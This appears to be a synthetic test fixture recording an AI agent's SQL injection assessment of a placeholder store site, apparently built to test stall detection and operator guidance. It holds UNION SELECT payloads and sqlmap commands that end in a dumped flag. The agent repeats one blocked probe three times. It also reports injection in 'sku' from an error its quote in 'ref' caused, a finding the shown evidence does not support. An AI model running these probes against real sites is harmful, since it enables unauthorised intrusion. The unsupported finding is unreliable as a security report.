@@ -1,0 +1,370 @@
+{
+ "_comment": "A synthetic agent chat session for the Skiller e2e spec (tests/pluginsSkiller.spec.ts): the sql_injection evaluation session of the plugin repository (skiller/eval/sessions/), events only. Documentation hosts and addresses only (example.org, 198.51.100.0/24).",
+ "skillId": "sql_injection",
+ "title": "Check store.example.org catalog",
+ "events": [
+  {
+   "type": "user_message",
+   "data": {
+    "content": "Assess store.example.org (198.51.100.40) for SQL injection in the catalog page."
+   }
+  },
+  {
+   "type": "phase_update",
+   "data": {
+    "current_phase": "informational",
+    "iteration_count": 0,
+    "attack_path_type": "",
+    "skill_workflow": null
+   }
+  },
+  {
+   "type": "phase_update",
+   "data": {
+    "current_phase": "informational",
+    "iteration_count": 1,
+    "attack_path_type": "sql_injection",
+    "skill_workflow": {
+     "skillId": "sql_injection",
+     "revision": 1,
+     "changeSetId": null
+    }
+   }
+  },
+  {
+   "type": "thinking",
+   "data": {
+    "iteration": 1,
+    "phase": "informational",
+    "thought": "Fetch the catalog page.",
+    "reasoning": "Reasoning for turn 1.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "type": "tool_start",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s -i 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp'"
+    },
+    "step_id": "step-0001-execute_curl"
+   }
+  },
+  {
+   "type": "tool_complete",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": true,
+    "output_summary": "The page answers 200.",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s -i 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp'"
+    },
+    "raw_output": "HTTP/1.1 200 OK\n\n<html>catalog</html>",
+    "step_id": "step-0001-execute_curl"
+   }
+  },
+  {
+   "type": "thinking",
+   "data": {
+    "iteration": 2,
+    "phase": "informational",
+    "thought": "Run sqlmap over the whole site with a deep crawl.",
+    "reasoning": "Reasoning for turn 2.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "orange",
+    "stall": 1
+   }
+  },
+  {
+   "type": "tool_start",
+   "data": {
+    "tool_name": "kali_shell",
+    "tool_args": {
+     "command": "sqlmap -u 'http://store.example.org/' --crawl 5 --forms --threads 10 --batch"
+    },
+    "step_id": "step-0002-kali_shell"
+   }
+  },
+  {
+   "type": "tool_complete",
+   "data": {
+    "tool_name": "kali_shell",
+    "success": false,
+    "output_summary": "sqlmap hung while crawling.",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 600000,
+    "tool_args": {
+     "command": "sqlmap -u 'http://store.example.org/' --crawl 5 --forms --threads 10 --batch"
+    },
+    "raw_output": "[CRITICAL] connection timed out\n[WARNING] crawling stalled",
+    "step_id": "step-0002-kali_shell"
+   }
+  },
+  {
+   "type": "thinking",
+   "data": {
+    "iteration": 3,
+    "phase": "informational",
+    "thought": "Try a UNION probe.",
+    "reasoning": "Reasoning for turn 3.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "orange",
+    "stall": 2
+   }
+  },
+  {
+   "type": "tool_start",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp%27%20UNION%20SELECT%20NULL--'"
+    },
+    "step_id": "step-0003-execute_curl"
+   }
+  },
+  {
+   "type": "tool_complete",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": false,
+    "output_summary": "Blocked by the filter.",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp%27%20UNION%20SELECT%20NULL--'"
+    },
+    "raw_output": "HTTP/1.1 403 Forbidden\nRequest blocked",
+    "step_id": "step-0003-execute_curl"
+   }
+  },
+  {
+   "type": "thinking",
+   "data": {
+    "iteration": 4,
+    "phase": "informational",
+    "thought": "Try a UNION probe.",
+    "reasoning": "Reasoning for turn 4.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "red",
+    "stall": 3
+   }
+  },
+  {
+   "type": "tool_start",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp%27%20UNION%20SELECT%20NULL--'"
+    },
+    "step_id": "step-0004-execute_curl"
+   }
+  },
+  {
+   "type": "tool_complete",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": false,
+    "output_summary": "Blocked by the filter.",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp%27%20UNION%20SELECT%20NULL--'"
+    },
+    "raw_output": "HTTP/1.1 403 Forbidden\nRequest blocked",
+    "step_id": "step-0004-execute_curl"
+   }
+  },
+  {
+   "type": "thinking",
+   "data": {
+    "iteration": 5,
+    "phase": "informational",
+    "thought": "Try a UNION probe.",
+    "reasoning": "Reasoning for turn 5.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "red",
+    "stall": 4
+   }
+  },
+  {
+   "type": "tool_start",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp%27%20UNION%20SELECT%20NULL--'"
+    },
+    "step_id": "step-0005-execute_curl"
+   }
+  },
+  {
+   "type": "deep_think",
+   "data": {
+    "trigger_reason": "productivity tier red",
+    "analysis": "The UNION family is blocked; try boolean or time-based probes.",
+    "iteration": 5,
+    "phase": "informational"
+   }
+  },
+  {
+   "type": "guidance",
+   "data": {
+    "content": "Stop the UNION probes, compare a true and a false boolean condition on sku instead.",
+    "isGuidance": true
+   }
+  },
+  {
+   "type": "phase_update",
+   "data": {
+    "current_phase": "exploitation",
+    "iteration_count": 6,
+    "attack_path_type": "sql_injection",
+    "skill_workflow": {
+     "skillId": "sql_injection",
+     "revision": 1,
+     "changeSetId": null
+    }
+   }
+  },
+  {
+   "type": "tool_complete",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": false,
+    "output_summary": "Blocked by the filter.",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp%27%20UNION%20SELECT%20NULL--'"
+    },
+    "raw_output": "HTTP/1.1 403 Forbidden\nRequest blocked",
+    "step_id": "step-0005-execute_curl"
+   }
+  },
+  {
+   "type": "thinking",
+   "data": {
+    "iteration": 6,
+    "phase": "exploitation",
+    "thought": "Report injection from the database error alone.",
+    "reasoning": "Reasoning for turn 6.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "type": "tool_start",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp%27'"
+    },
+    "step_id": "step-0006-execute_curl"
+   }
+  },
+  {
+   "type": "tool_complete",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": true,
+    "output_summary": "A database error: injectable.",
+    "actionable_findings": [
+     "SQL injection in sku at /catalog/item"
+    ],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp%27'"
+    },
+    "raw_output": "HTTP/1.1 500\nSQL syntax error near ''AB-7731''",
+    "step_id": "step-0006-execute_curl"
+   }
+  },
+  {
+   "type": "thinking",
+   "data": {
+    "iteration": 7,
+    "phase": "exploitation",
+    "thought": "Dump the flag.",
+    "reasoning": "Reasoning for turn 7.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "type": "tool_start",
+   "data": {
+    "tool_name": "kali_shell",
+    "tool_args": {
+     "command": "sqlmap -u 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp' -p sku --technique=B --threads 1 --batch"
+    },
+    "step_id": "step-0007-kali_shell"
+   }
+  },
+  {
+   "type": "tool_complete",
+   "data": {
+    "tool_name": "kali_shell",
+    "success": true,
+    "output_summary": "Boolean-based injection confirmed.",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "command": "sqlmap -u 'http://store.example.org/catalog/item?sku=AB-7731&ref=hp' -p sku --technique=B --threads 1 --batch"
+    },
+    "raw_output": "[INFO] sku is vulnerable\nretrieved: FLAG{eval_sqli_b51c}",
+    "step_id": "step-0007-kali_shell"
+   }
+  },
+  {
+   "type": "assistant_message",
+   "data": {
+    "content": "Injection in sku on store.example.org; flag FLAG{eval_sqli_b51c}.",
+    "phase": "exploitation",
+    "task_complete": true,
+    "response_tier": "full_report"
+   }
+  },
+  {
+   "type": "task_complete",
+   "data": {
+    "message": "Task completed successfully",
+    "final_phase": "exploitation",
+    "total_iterations": 7
+   }
+  }
+ ]
+}
